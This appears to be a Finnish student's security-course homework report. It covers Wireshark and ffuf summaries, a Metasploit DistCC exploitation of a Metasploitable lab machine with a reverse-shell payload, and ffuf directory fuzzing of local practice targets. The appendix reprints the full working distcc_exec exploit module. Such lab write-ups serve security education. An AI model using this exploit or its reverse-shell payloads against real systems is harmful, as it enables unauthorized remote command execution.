# h3 Nuuskija

## Johdanto

Kotitehtävässä h3 oli tarkoituksena syventyä kotitehtävästä h2 tuttuihin Metasploitable-hyökkäyspaketteihin, viikon 45 oppitunnilla käytyihin hyökkäysten lähdekoodiin, verkkosniffaamiseen ja HackTheBoxiin sekä uutena asiana Fuzzaamiseen.

## Ennakkomateriaali (Kohta X)

Viikon aiheeseen liittyen tuli tiivistää Popovin artikkeli Wiresharkista ja Karvisen artikkeli Fuzzista.

### Wireshark Tricks

- Wiresharkin tuloksistaa voi `Analyze` ja `Statistics` -osioista löytää tärkeitä tietoja esimerkiksi pakettien tarkasta sisällöstä, käytetyistä protokollista ja DNS-kyselyistä

- Wiresharkin haku- ja suodatustyökaluja voi käyttää esimerkiksi HTTP-headerin tai hostin nimen selvittämiseen.

- Wireshark voi jopa dekryptoida HTTPS-liikennettä käyttämällä selaimen TLS sessio-avaimia tai palvelimen yksityistä avainta.

### Fuzz URL's with ffuf

- Fuzzaamisessa testataan verkkopalvelimen vasteita syöttämällä sille erinäisiä syötteitä (useimmiten satunnaisesti).

- Fuzzaamalla voidaan löytää verkkopalvelimesta piilotettuja hakemistoja, joihin ei ole muuten pääsyä.

- Ffuf on työkalu, joka suorittaa fuzzaamisen nopeasti ja automaattisesti.

### Lähteet

Popov 2024: Hacktricks: Wireshark tricks. Luettavissa: https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/wireshark-tricks#improve-your-wireshark-skills. Luettu 10.11.2024

Karvinen 2023: Find Hidden Web Directories - Fuzz URLs with ffuf. Luettavissa: https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/. Luettu 10.11.2024

## Hyökkäys, sorsastus, wireshark (Kohdat A-C)

Aloitin tehtävän tarkistamalla tuttuun tapaan, että koneet saavat yhteyden VAIN toisiinsa HostOnly-verkossa, eivätkä muualle.

![image](https://github.com/user-attachments/assets/9512273c-df9c-4c83-9e9d-06bb99d4b51f)
![image](https://github.com/user-attachments/assets/f6dc88d7-ccce-4897-864f-d8833e2fe618)

_Yhteyskokeilu_

Tämän jälkeen avasin msf-konsolin ja valmistelin exploitin. Otin tehtävää varten itselleni uuden exploitin, eli `DistCC Daemon Command Execution` -hyökkäyksen. 

![image](https://github.com/user-attachments/assets/f0ab69b9-b989-4203-8982-b95fb128f457)

_Hyökkäyksen valinta ja konfigurointi_

Tässä vaiheessa hyödyllinen on `show options`-komento, joka näyttää ne parametrit, joita voin konfiguroida. Tässä tapauksessa olennaista on konfiguroida hyökkäyskohde `set RHOST` ja hyökkääjä `set LHOST`.

Valitettavasti tässä tapauksessa exploit ei saanut yhteyttä kohteeseen. Ohjelman antamasta palautteesta pystyin arvioida, että kyse on todennäköisesti virheellisestä payloadista. 

Metasploit antoi automaattisesti payloadin `cmd/unix/reverse_bash`, mutta tämä ei ole välttämättä oikea. Otin yksinkertaisemman `cmd/unix/reverse` payloadin käyttöön ja hyökkäys onnistui.

![image](https://github.com/user-attachments/assets/ed899a8b-b887-4df3-9aca-d779c8a5ebed)

_Uusi payload, onnistunut hyökkäys_

Palasin tämän jälkeen vielä tarkastelemaan hyökkäyksen lähdekoodia. Otin sen talteen `edit`-komennolla. Lähdekoodi löytyy raportin "liitteet"-osiosta. Lähdekoodia tarkastellessa voin tehdä omia tulkintoja sen luonteesta...

Lopuksi suoritin vielä hyökkäyksen uudelleen, tällä kertaa pitäen Wiresharkkia päällä toisessa terminaalissa. Verkkoliikenteestä voi arvioida...

### Lähteet

Metasploit: Metasploitable 2 Exploitability Guide. Luettavissa: https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/.
Metasploit: DistCC Daemon Command Execution. Luettavissa: https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec/.

## Fuzz & Ffuf (Kohta D)

Viikon kotitehtävässä tuli myös harjoitella Fuzzaamista Ffuf työkalulla. Latasin ensin harjoitemaalin `dirfuz-0`, Ffufin ja sanakirjan Kaliin. Tässä vaiheessa oli hyvä hetki vetää verkkokortti VirtualBoxin seinästä, sille emme tarvitse verkkoyhteyttä harjoituksessa. Laajaa pyyntöspämmiä tuskin kannattaa kuitenkaan päästää omasta ympäristöstä verkkoon.

![image](https://github.com/user-attachments/assets/aab04dfd-f0d2-40f6-82c7-570de1392979)

_Harjoitusmaali valmiina_

![image](https://github.com/user-attachments/assets/39d83f97-2e94-49f2-b9d1-d9bcd1bc57e8)

_Ffuf valmiina, kaipaa vain kohdetta_

Löin ensin koko sanalistan läpi verkko-osoitteen päätteeksi `./ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ`. 

![image](https://github.com/user-attachments/assets/a206dc63-87e9-427d-a0f6-78b0abd5f880)

![image](https://github.com/user-attachments/assets/8510891e-21ef-47d7-bbce-4c0e52e5403b)

_/FUZZ tulos_

Tämä ei kuitenkaan vaikuttanut siltä, mitä halusin. Ffuf kävi kyllä läpi 4734 kyselyä, mutta kaikki palauttavat saman 200 status vastauksen (yhteydenotto onnistui). 

Suodatetaan hakuamme vähän tarkemmaksi. Helpointa olisi sulkea pois yleiset vastaukset. Tässä tapauksessa vastauksen koko 132 tavua on yleinen tekijä näissä vastauksissa.

![image](https://github.com/user-attachments/assets/be44f192-a3c6-4130-85ec-90375dd92ca1)

_132 tavun suodatushaku_

Tällä suodatuksella haavin jäi vain kaksi kohdetta. Toisessa HTTP vastaus ei saanut yhteyttä, vaan pyyntömme ohjattiin googlen sivuille. Tämä ei ole suoraan kiinnostavaa tehtävän näkökulmasta. Toinen taas on huomattavan kiinnostava, koska `/FUZZ` löysi päätteen `/admin`. Katsoin tämän osoitteen selaimella ja sehän oli oikea.

![image](https://github.com/user-attachments/assets/8cd2ed6a-2470-49a5-915c-db06f7cdeb37)

_You found it!_

Seuraavaksi lähdin itse kotityötehtävän kohdemaalin `dirfuz-1` pariin. Latasin harjoitemaalin tuttuun tapaan.

![image](https://github.com/user-attachments/assets/329ebec7-84eb-4b3d-8576-631958bbbe04)

_Dirfuz-1_

Aloitin taas helpoimmasta ja katsoin ensin tyypillisen `./ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ`. Tämän jälkeen lisäsin ehdoiksi `-fs 132 -fs 154`, jotta saisin suodatettua pois yleisimmät vastaukset. Lopputulokseen jäi haaviin kiinnostava vastaus. Katsoin sen tämän jälkeen seilaimella.

![image](https://github.com/user-attachments/assets/247f6a7b-7713-4c7f-bf17-dbf76c051a4c)

![image](https://github.com/user-attachments/assets/0f144031-bea6-4021-a99d-8a759bd87716)

_Lippua esiin_

Sieltä se admin löytyikin lipulla `tero-wpadmin-3364c855a2ac87341fc7bcbda955b580`. Vielä tulisi löytää versionhallintaan liityvä sivu. Aikaisempia suodatustuloksia tarkastaessa liite `.git` herätti kiinnostusta, koska tämä on useimmiten yhteydessä Git repositioon, eli versionhallintaan.

![image](https://github.com/user-attachments/assets/dae39df0-9387-475d-8ec7-c7d60e1c2911)

_Liput taskussa_

Ja siellähän se olikin. Versionhallinta löytyi `.git`-liitteestä lipulla `tero-git-3cc87212bcd411686a3b9e547d47fc51`.

## HackTheBox (Kohta E)

## Lähteet

### Liitteet

_Liite 1: DistCC lähdekoodi_

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DistCC Daemon Command Execution',
      'Description'    => %q{
        This module uses a documented security weakness to execute
        arbitrary commands on any system running distccd.

      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2004-2687'],
          [ 'OSVDB', '13378' ],
          [ 'URL', 'http://distcc.samba.org/security.html'],

        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {

              'RequiredCmd' => 'generic perl ruby bash telnet openssl bash-tcp',
            }
        },
      'Targets'        =>
        [
          [ 'Automatic Target', { }]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2002-02-01'
      ))

      register_options(
        [
          Opt::RPORT(3632)
        ])
  end

  def check
    r = rand_text_alphanumeric(10)
    connect
    sock.put(dist_cmd("sh", "-c", "echo #{r}"))

    dtag = rand_text_alphanumeric(10)
    sock.put("DOTI0000000A#{dtag}\n")

    err, out = read_output
    if out && out.index(r)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    connect

    distcmd = dist_cmd("sh", "-c", payload.encoded);
    sock.put(distcmd)

    dtag = rand_text_alphanumeric(10)
    sock.put("DOTI0000000A#{dtag}\n")

    err, out = read_output

    (err || "").split("\n") do |line|
      print_status("stderr: #{line}")
    end
    (out || "").split("\n") do |line|
      print_status("stdout: #{line}")
    end

    handler
    disconnect
  end

  def read_output

    res = sock.get_once(24, 5)

    if !(res and res.length == 24)
      print_status("The remote distccd did not reply to our request")
      disconnect
      return
    end

    # Check STDERR
    res = sock.get_once(4, 5)
    res = sock.get_once(8, 5)
    len = [res].pack("H*").unpack("N")[0]

    return [nil, nil] if not len
    if (len > 0)
      err = sock.get_once(len, 5)
    end

    # Check STDOUT
    res = sock.get_once(4, 5)
    res = sock.get_once(8, 5)
    len = [res].pack("H*").unpack("N")[0]

    return [err, nil] if not len
    if (len > 0)
      out = sock.get_once(len, 5)
    end
    return [err, out]

  end


  # Generate a distccd command
  def dist_cmd(*args)

    # Convince distccd that this is a compile
    args.concat(%w{# -c main.c -o main.o})

    # Set distcc 'magic fairy dust' and argument count
    res = "DIST00000001" + sprintf("ARGC%.8x", args.length)

    # Set the command arguments
    args.each do |arg|
      res << sprintf("ARGV%.8x%s", arg.length, arg)
    end

    return res
  end
end
```

